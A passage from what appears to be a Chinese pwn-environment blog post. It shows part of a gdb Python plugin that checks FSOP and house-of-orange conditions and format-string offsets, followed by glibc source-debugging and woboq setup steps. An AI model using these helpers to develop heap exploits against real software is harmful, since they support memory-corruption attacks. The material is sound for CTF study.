</span></span><span class="line"><span class="cl">    <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&#34;x/&#34;</span> <span class="o">+</span> <span class="n">word</span> <span class="o">+</span> <span class="s2">&#34;&amp;_IO_list_all&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">head</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">gdb</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span><span class="n">to_string</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">(),</span><span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\033</span><span class="s2">[32mfpchain:</span><span class="se">\033</span><span class="s2">[1;37m &#34;</span><span class="p">,</span><span class="n">end</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">chain</span> <span class="o">=</span> <span class="n">head</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;0x</span><span class="si">%x</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">chain</span><span class="p">,</span><span class="n">end</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="n">chain</span> <span class="o">!=</span> <span class="mi">0</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34; --&gt; &#34;</span><span class="p">,</span><span class="n">end</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&#34;x/&#34;</span> <span class="o">+</span> <span class="n">word</span> <span class="o">+</span> <span class="s2">&#34;&amp;((struct _IO_FILE_plus *)&#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">chain</span><span class="p">)</span> <span class="o">+</span><span class="s2">&#34;).file._chain&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="n">chain</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">gdb</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span><span class="n">to_string</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">(),</span><span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;0x</span><span class="si">%x</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">chain</span><span class="p">,</span><span class="n">end</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Chain is corrupted&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">testorange</span><span class="p">(</span><span class="n">addr</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">getarch</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">    <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&#34;x/&#34;</span> <span class="o">+</span> <span class="n">word</span> <span class="o">+</span> <span class="s2">&#34;&amp;((struct _IO_FILE_plus *)&#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;).file._mode&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">mode</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">gdb</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span><span class="n">to_string</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">(),</span><span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span>
</span></span><span class="line"><span class="cl">    <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&#34;x/&#34;</span> <span class="o">+</span> <span class="n">word</span> <span class="o">+</span> <span class="s2">&#34;&amp;((struct _IO_FILE_plus *)&#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;).file._IO_write_ptr&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">write_ptr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">gdb</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span><span class="n">to_string</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">(),</span><span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&#34;x/&#34;</span> <span class="o">+</span> <span class="n">word</span> <span class="o">+</span> <span class="s2">&#34;&amp;((struct _IO_FILE_plus *)&#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;).file._IO_write_base&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">write_base</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">gdb</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span><span class="n">to_string</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">(),</span><span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">mode</span> <span class="o">&lt;</span> <span class="mh">0x80000000</span> <span class="ow">and</span> <span class="n">mode</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&#34;x/&#34;</span> <span class="o">+</span> <span class="n">word</span> <span class="o">+</span> <span class="s2">&#34;&amp;((struct _IO_FILE_plus *)&#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;).file._wide_data&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="n">wide_data</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">gdb</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span><span class="n">to_string</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">(),</span><span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&#34;x/&#34;</span> <span class="o">+</span> <span class="n">word</span> <span class="o">+</span> <span class="s2">&#34;&amp;((struct _IO_wide_data *)&#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">wide_data</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;)._IO_write_ptr&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="n">w_write_ptr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">gdb</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span><span class="n">to_string</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">(),</span><span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&#34;x/&#34;</span> <span class="o">+</span> <span class="n">word</span> <span class="o">+</span> <span class="s2">&#34;&amp;((struct _IO_wide_data *)&#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">wide_data</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;)._IO_write_base&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="n">w_write_base</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">gdb</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span><span class="n">to_string</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">(),</span><span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">w_write_ptr</span> <span class="o">&lt;=</span> <span class="n">w_write_base</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\033</span><span class="s2">[;1;31m_wide_data-&gt;_IO_write_ptr(0x</span><span class="si">%x</span><span class="s2">) &lt; _wide_data-&gt;_IO_write_base(0x</span><span class="si">%x</span><span class="s2">)</span><span class="se">\033</span><span class="s2">[1;37m&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">w_write_ptr</span><span class="p">,</span><span class="n">w_write_base</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">                <span class="n">result</span> <span class="o">=</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\033</span><span class="s2">;1;31mCan&#39;t access wide_data</span><span class="se">\033</span><span class="s2">[1;37m&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">result</span> <span class="o">=</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">write_ptr</span> <span class="o">&lt;=</span> <span class="n">write_base</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\033</span><span class="s2">[;1;31m_IO_write_ptr(0x</span><span class="si">%x</span><span class="s2">) &lt; _IO_write_base(0x</span><span class="si">%x</span><span class="s2">)</span><span class="se">\033</span><span class="s2">[1;37m&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">write_ptr</span><span class="p">,</span><span class="n">write_base</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="n">result</span> <span class="o">=</span> <span class="kc">False</span>  
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">result</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Result : </span><span class="se">\033</span><span class="s2">[34mTrue</span><span class="se">\033</span><span class="s2">[37m&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&#34;x/&#34;</span> <span class="o">+</span> <span class="n">word</span> <span class="o">+</span> <span class="s2">&#34;&amp;((struct _IO_FILE_plus *)&#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;).vtable.__overflow&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="n">overflow</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">gdb</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span><span class="n">to_string</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">(),</span><span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Func : </span><span class="se">\033</span><span class="s2">[33m 0x</span><span class="si">%x</span><span class="se">\033</span><span class="s2">[1;37m&#34;</span> <span class="o">%</span> <span class="n">overflow</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Result : </span><span class="se">\033</span><span class="s2">[31mFalse</span><span class="se">\033</span><span class="s2">[1;37m&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">testfsop</span><span class="p">(</span><span class="n">addr</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">getarch</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">addr</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&#34;x/&#34;</span> <span class="o">+</span> <span class="n">word</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&#34;x/&#34;</span> <span class="o">+</span> <span class="n">word</span> <span class="o">+</span> <span class="s2">&#34;&amp;_IO_list_all&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">head</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">gdb</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span><span class="n">to_string</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">(),</span><span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">chain</span> <span class="o">=</span> <span class="n">head</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;---------- fp : 0x</span><span class="si">%x</span><span class="s2"> ----------&#34;</span> <span class="o">%</span> <span class="n">chain</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">testorange</span><span class="p">(</span><span class="n">chain</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="n">chain</span> <span class="o">!=</span> <span class="mi">0</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&#34;x/&#34;</span> <span class="o">+</span> <span class="n">word</span> <span class="o">+</span> <span class="s2">&#34;&amp;((struct _IO_FILE_plus *)&#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">chain</span><span class="p">)</span> <span class="o">+</span><span class="s2">&#34;).file._chain&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="n">chain</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">gdb</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span><span class="n">to_string</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">(),</span><span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">chain</span> <span class="o">!=</span> <span class="mi">0</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;---------- fp : 0x</span><span class="si">%x</span><span class="s2"> ----------&#34;</span> <span class="o">%</span> <span class="n">chain</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">testorange</span><span class="p">(</span><span class="n">chain</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Chain is corrupted&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">getfmtarg</span><span class="p">(</span><span class="n">addr</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">capsize</span> <span class="o">==</span> <span class="mi">0</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">getarch</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">arch</span> <span class="o">==</span> <span class="s2">&#34;i386&#34;</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">start</span> <span class="o">=</span> <span class="n">get_reg</span><span class="p">(</span><span class="s2">&#34;esp&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">idx</span> <span class="o">=</span> <span class="p">(</span><span class="n">addr</span><span class="o">-</span> <span class="n">start</span><span class="p">)</span><span class="o">/</span><span class="mi">4</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;The index of format argument : </span><span class="si">%d</span><span class="s2"> (</span><span class="se">\&#34;</span><span class="s2">\</span><span class="si">%%%d</span><span class="s2">$p</span><span class="se">\&#34;</span><span class="s2">)&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">idx</span><span class="p">,</span><span class="n">idx</span> <span class="o">-</span> <span class="mi">1</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="n">arch</span> <span class="o">==</span> <span class="s2">&#34;x86-64&#34;</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">start</span> <span class="o">=</span> <span class="n">get_reg</span><span class="p">(</span><span class="s2">&#34;rsp&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">idx</span> <span class="o">=</span> <span class="p">(</span><span class="n">addr</span> <span class="o">-</span> <span class="n">start</span><span class="p">)</span><span class="o">/</span><span class="mi">8</span> <span class="o">+</span> <span class="mi">6</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;The index of format argument : </span><span class="si">%d</span><span class="s2"> (</span><span class="se">\&#34;</span><span class="s2">\</span><span class="si">%%%d</span><span class="s2">$p</span><span class="se">\&#34;</span><span class="s2">)&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">idx</span><span class="p">,</span><span class="n">idx</span> <span class="o">-</span> <span class="mi">1</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Not support the arch&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">pwncmd</span> <span class="o">=</span> <span class="n">PwnCmd</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">PwngdbCmd</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">cmd</span> <span class="ow">in</span> <span class="n">pwncmd</span><span class="o">.</span><span class="n">commands</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">PwngdbAlias</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span><span class="s2">&#34;pwngdb </span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="n">cmd</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">gdb</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s2">&#34;set print asm-demangle on&#34;</span><span class="p">)</span> 
</span></span></code></pre></td></tr></table>
</div>
</div><p>源码调试</p>
<p><a href="https://mirrors.tuna.tsinghua.edu.cn/gnu/libc/" target="_blank" rel="noopener noreffer ">清华源</a></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/20393921-68b6f81847981f96.png"
        data-srcset="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/20393921-68b6f81847981f96.png, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/20393921-68b6f81847981f96.png 1.5x, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/20393921-68b6f81847981f96.png 2x"
        data-sizes="auto"
        alt="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/20393921-68b6f81847981f96.png"
        title="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/20393921-68b6f81847981f96.png" /></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">set substitute-path /build/glibc-CVJwZb/glibc-2.27/ /home/ubuntu/glibc/glibc-2.27/
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/20393921-8fc4236dbd4bc3b9.png"
        data-srcset="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/20393921-8fc4236dbd4bc3b9.png, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/20393921-8fc4236dbd4bc3b9.png 1.5x, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/20393921-8fc4236dbd4bc3b9.png 2x"
        data-sizes="auto"
        alt="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/20393921-8fc4236dbd4bc3b9.png"
        title="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/20393921-8fc4236dbd4bc3b9.png" /></p>
<h2 id="莫名奇妙的bug">莫名奇妙的bug</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">解决vmware安装vm-tools无效
</span></span><span class="line"><span class="cl">sudo apt-get autoremove open-vm-tools
</span></span><span class="line"><span class="cl">sudo apt-get install open-vm-tools-desktop
</span></span><span class="line"><span class="cl">reboot 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">解决vmware和hyper-v冲突
</span></span><span class="line"><span class="cl">bcdedit /set hypervisorlaunchtype off
</span></span><span class="line"><span class="cl">解决吞字
</span></span><span class="line"><span class="cl">禁用usb间接性暂停
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="woboq">woboq</h2>
<blockquote>
<p>woboq是一款优秀的代码阅读器</p>
</blockquote>
<h3 id="glibc">glibc</h3>
<h4 id="glibc源码">glibc源码</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">git clone https://sourceware.org/git/glibc.git <span class="o">&amp;&amp;</span> <span class="nb">cd</span> glibc
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="安装bear">安装bear</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo apt-get install bear
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="安装woboq">安装woboq</h4>
<p>编译完后 <code>./generator/codebrowser_generator</code> 是代码生成器, <code>./indexgenerator/codebrowser_indexgenerator</code> 是索引生成器.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo apt-get install llvm-12 clang-12 libclang-12-dev
</span></span><span class="line"><span class="cl">git clone https://github.com/KDAB/codebrowser
</span></span><span class="line"><span class="cl">cd codebrowser
</span></span><span class="line"><span class="cl">cmake . -DCMAKE_BUILD_TYPE=Release
</span></span><span class="line"><span class="cl">make
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="使用bear编译glibc源码-例如234">使用bear编译glibc源码 (例如2.34)</h4>
<p>生成 <code>compile_commands.json</code> 文件</p>
<p>中间会提示很多东西缺少或者版本太低了，缺啥补啥就行了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cd glibc
</span></span><span class="line"><span class="cl">git checkout release/2.34/master
</span></span><span class="line"><span class="cl">../configure --prefix=/usr --disable-werror
</span></span><span class="line"><span class="cl">bear make
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="解析">解析</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># ./generator/codebrowser_generator -b $BUILD_DIRECTORY -a -o $OUTPUT_DIRECTORY -p codebrowser:$SOURCE_DIRECTORY:$VERSION</span>
</span></span><span class="line"><span class="cl"><span class="c1"># ./indexgenerator/codebrowser_indexgenerator $OUTPUT_DIRECTORY</span>
</span></span><span class="line"><span class="cl"><span class="c1"># cp -rv ./data $DATA_DIRECTORY</span>
</span></span><span class="line"><span class="cl">./generator/codebrowser_generator -b /home/ubuntu/glibc/build -a -o /home/ubuntu/woboq/glibc/2.34 -p 2.34:/home/ubuntu/glibc:2.34
</span></span><span class="line"><span class="cl">./indexgenerator/codebrowser_indexgenerator /home/ubuntu/woboq/glibc/2.34
</span></span><span class="line"><span class="cl">cp -rv ./data /home/ubuntu/woboq/glibc/data
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">cd</span> /home/ubuntu/woboq/glibc/ <span class="o">&amp;&amp;</span> python3 -m http.server <span class="m">9999</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230220223230920.png"
        data-srcset="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230220223230920.png, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230220223230920.png 1.5x, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/image-20230220223230920.png 2x"
        data-sizes="auto"
